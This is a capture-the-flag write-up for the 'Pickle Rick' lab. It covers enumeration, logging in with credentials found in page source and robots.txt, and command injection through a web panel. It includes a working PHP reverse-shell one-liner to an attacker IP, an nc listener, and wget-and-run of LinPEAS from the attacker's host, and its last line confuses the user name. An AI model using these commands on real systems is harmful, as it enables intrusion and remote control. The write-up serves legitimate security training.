# Pickle Rick

IP - 10.10.191.16

## Scanning and Enumeration

nmap scan:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d3:e5:84:36:c0:98:a2:63:04:01:cc:75:a9:d1:94:2a (RSA)
|   256 b9:37:a1:31:ab:af:e7:a3:1d:bf:32:39:67:00:b6:6b (ECDSA)
|_  256 b9:1d:36:7c:9f:a9:19:a6:be:34:f5:7c:97:0e:18:43 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|http-title: Rick is sup4r cool
| http-methods:
|  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

dirsearch:
```
[21:38:43] 403 -   277B - /.php

[21:38:59] 200 -    2KB - /assets/

[21:38:59] 301 -   313B - /assets  ->  http://10.10.191.16/assets/

[21:39:13] 200 -    1KB - /index.html

[21:39:16] 200 -   882B - /login.php

[21:39:26] 200 -    17B - /robots.txt
```
- Viewed HTML source code (ctrl + U) on picklerick.thm website and found Username: R1ckRul3s.
- Found password in 10.10.191.16/robots.txt - Wubbalubbadubdub
- Navigate to /login.php and used username R1ckRul3s and password Wubbalubbadubdub to log in.

## Exploit
Command Panel is vulnerable and allowing to use commands to get information. I used "ls -a" to list all files including hidden files and found Sup3rS3cretPickl3Ingred.txt. I was able to get the first ingredient by running - ``` grep . -R ```

## Reverse Shell
- set Terminal to listen - ``` nc -nvlp 4444 ```
- Executed PHP reverse shell and gained access: 
```
php -r '$sock=fsockopen("10.6.41.41",4444);exec("/bin/sh -i <&3 >&3 2>&3");’
```
Cheatsheet - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Navigate to /home > ``` grep . -R ``` to get second ingredient.

## Post-Exploit (LinPEAS)
- Opened new tab in the terminal and ran - ``` python3 -m http.server 8000 ```
- ``` wget http://10.6.41.41:8000/linpeas.sh -O /tmp/linpeas.sh ```
- ``` chmod +x /tmp/linpeas.sh ```
- ``` /tmp/linpeas.sh ```
Results from LinePEAS - User www-data may run the following commands on ip-10-10-191-16:
(ALL) NOPASSWD: ALL
This means that you can run any command as scriptmanager, and optionally set your group to scriptmanager when doing so




